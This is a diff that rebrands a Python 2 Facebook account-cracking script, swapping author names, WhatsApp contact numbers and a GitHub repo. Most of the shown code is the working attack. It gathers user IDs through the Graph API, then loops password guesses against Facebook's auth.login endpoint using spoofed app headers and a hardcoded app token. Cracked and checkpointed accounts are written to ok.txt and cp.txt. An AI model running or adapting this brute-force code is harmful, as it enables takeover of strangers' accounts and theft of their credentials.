@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 # -*- coding: utf-8
 
-#AUTHOR : ANONYMOUS ADAMS (ZAZU)
+#AUTHOR : OLAIDE&MIRACLE (FOMO)
 #OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO ZAZU
+#DON'T FORGET TO GIVE CREDIT TO FOMO
 
 P = "\033[97;1m" 
 M = "\033[91;1m" 
@@ -41,7 +41,7 @@ agents = [
 					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
 				  ]
 				
-header = {"user-agent": '[Mozilla/5.0 (Linux; Android 11; SHARK PRS-H0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36;]',
+header = {"user-agent": '[Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15;]',
 					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
 					  "x-fb-net-hni": str(random.randint(20000, 40000)),
@@ -71,14 +71,14 @@ print("")
 # LO KONTOL
 logo = """
 
-\033[37;1m[\033[41;1mANONYMOUS ADAMS\033[00;1m\033[37;1m ]\n
+\033[37;1m[\033[41;1mOLAIDE MIRACLE\033[00;1m\033[37;1m ]\n
 
- \033[32;1mCreator \033[37;1m: \033[33;1mANON_ADAMS
+ \033[32;1mCreator \033[37;1m: \033[33;1mCHIGOZIE
  
  \033[32;1mVersion \033[37;1m: \033[33;1m100                                   
 """
-CorrectUsername = "ZAZU"
-CorrectPassword = "ZEEH"
+CorrectUsername = "FOMO"
+CorrectPassword = "DREAM"
 
 loop = 'true'
 while (loop == 'true'):
@@ -90,19 +90,19 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/+2349032921686')
+            os.system('xdg-open https://wa.me/+2348069472717')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/+2349032921686')	
+        os.system('xdg-open https://wa.me/+2348069472717')	
 def logo():
-		os.system('echo  "\n\n ╔═════════════════════════════╗\n    ║ TOOL NAME: { ZAZU }        ║\n    ║ AUTHOR   : ANONYMOUS ADAMS            ║\n    ║ GITHUB   : ANONYMOUS ADAMS       ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
+		os.system('echo  "\n\n ╔═════════════════════════════╗\n    ║ TOOL NAME: { FOMO }        ║\n    ║ AUTHOR   : OLAIDE&MIRACLE            ║\n    ║ GITHUB   : PROHACKERS111       ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
 	logo()
 	print("\t\033[93;1m      MAIN MENU\x1b[0m")
 	print("")
-	print("\033[92;1m  [1] START HACKING")
+	print("\033[92;1m  [1] START CRACK")
 	print("\033[93;1m  [2] CRACK USER IDS")
 	print("\033[94;1m  [3] BUY ACCESS TOKEN APP")
 	print("\033[96;1m  [4] OWNER")
@@ -121,18 +121,18 @@ def log_sel():
 	elif sel =="2" or sel =="02":
 		ex_id()
 	elif sel =="3" or sel =="03":
-		subprocess.check_output(["am", "start", "https://wa.me/+2349032921686"])
+		subprocess.check_output(["am", "start", "https://wa.me/+2348069472717"])
 		main()
 	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		os.system('xdg-open https://wa.me/+2349032921686')
+		os.system('xdg-open https://wa.me/+2348069472717')
 		main()
 	elif sel =="5" or sel =="05":
 		import os
 		try:
-			os.system("git clone https://github.com/Hardams/Bini")
-			os.system("rm -rf ZAZU")
-			os.system("cp -f ZAZU/ZAZU.py \\.")
-			os.system("rm -rf ZAZU")
+			os.system("git clone https://github.com/Prohackers111/Bini")
+			os.system("rm -rf FOMO")
+			os.system("cp -f FOMO/FOMO.py \\.")
+			os.system("rm -rf FOMO")
 			print "\033[92;1m\n TOOL UPDATE SUCCESSFULFUL...>_<\n"
 			time.sleep(2)
 			main()
@@ -140,7 +140,7 @@ def log_sel():
 			print "\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n"
 	        	main()
 	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE COMRADE SEE YOU AGAIN :)")
+		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
 		sys.exit()
 	else:
 		print("")
@@ -196,7 +196,7 @@ def menu():
     xn = name.upper()
     logo()
     print("")
-    print("\033[93;1m     HELLO ANONYMOUS!   : \033[92;1m"+xn)
+    print("\033[93;1m     HELLO!   : \033[92;1m"+xn)
     print("\033[93;1m     REGION  : \033[92;1m") + loc
     print("\033[93;1m     YOUR IP : \033[92;1m") + ip
     print("")
@@ -255,7 +255,7 @@ def crack_select1():
 		os.system("clear")
 		logo()
 		print("")
-		idt = raw_input("\033[92;1m  INPUT TARGET ID : ")
+		idt = raw_input("\033[92;1m  INPUT PUBLIC ID : ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
@@ -327,7 +327,7 @@ def crack_select1():
 		crack_select1()
 	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
 	print("\033[93;1m  THE PROCESS HAS STARTED")
-	print("\033[92;1m  ANON ADAMS CLONING ACTIVATED \x1b[0m")
+	print("\033[92;1m  CHIGOZIE CLONING ACTIVATED \x1b[0m")
 	print("")
 	linex()
 	print("")
@@ -342,14 +342,14 @@ def crack_select1():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -359,14 +359,14 @@ def crack_select1():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -376,14 +376,14 @@ def crack_select1():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -393,14 +393,14 @@ def crack_select1():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -410,14 +410,14 @@ def crack_select1():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -427,14 +427,14 @@ def crack_select1():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -444,14 +444,14 @@ def crack_select1():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -461,14 +461,14 @@ def crack_select1():
 																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																	q = json.loads(data)
 																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass8+"\033[0;97m")
+																		print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass8+"\033[0;97m")
+																			print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
@@ -508,7 +508,7 @@ def crack():
 	print("")
 	print("\t\033[93;1m  MANUAL PASS CRACKING")
 	print("")
-	print("\033[94;1m  [1] CRACK TARGET ID")
+	print("\033[94;1m  [1] CRACK PUBLIC ID")
 	print("\033[93;1m  [2] CRACK FOLLOWERS")
 	print("\033[92;1m  [3] CRACK FILE")
 	print("")
@@ -653,14 +653,14 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -670,14 +670,14 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -687,14 +687,14 @@ def crack_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -704,14 +704,14 @@ def crack_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -720,14 +720,14 @@ def crack_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -736,14 +736,14 @@ def crack_select():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -752,14 +752,14 @@ def crack_select():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -769,14 +769,14 @@ def crack_select():
 																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																	q = json.loads(data)
 																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [ANON_ADAMS-OK] "+uid+" | "+pass8+"\033[0;97m")
+																		print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [ANON_ADAMS-CP] "+uid+" | "+pass8+"\033[0;97m")
+																			print(" \033[1;33m [CHIGOZIE-CP] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
